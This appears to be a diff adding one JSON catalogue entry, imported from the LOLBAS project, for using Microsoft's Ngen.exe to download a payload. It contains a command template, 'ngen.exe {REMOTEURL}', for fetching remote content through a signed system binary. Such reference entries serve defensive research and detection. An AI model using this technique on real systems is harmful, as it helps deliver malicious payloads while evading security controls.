@@ -1,0 +1,23 @@
+{
+  "id": "lolbas-ngen-exe-download",
+  "name": "LOLBAS · Ngen.exe (Download)",
+  "command": "ngen.exe {REMOTEURL}",
+  "description": "Downloads payload from remote server using the Microsoft Native Image Generator utility.",
+  "platform": "windows",
+  "tags": [
+    "lolbas",
+    "ngen",
+    "download"
+  ],
+  "source": "lolbas",
+  "source_url": "https://lolbas-project.github.io/lolbas/Ngen/",
+  "upstream_id": "Ngen.exe/Download/0",
+  "category": "lolbas",
+  "subcategory": "download",
+  "references": [
+    {
+      "title": "LOLBAS — Ngen.exe",
+      "url": "https://lolbas-project.github.io/lolbas/Ngen/"
+    }
+  ]
+}
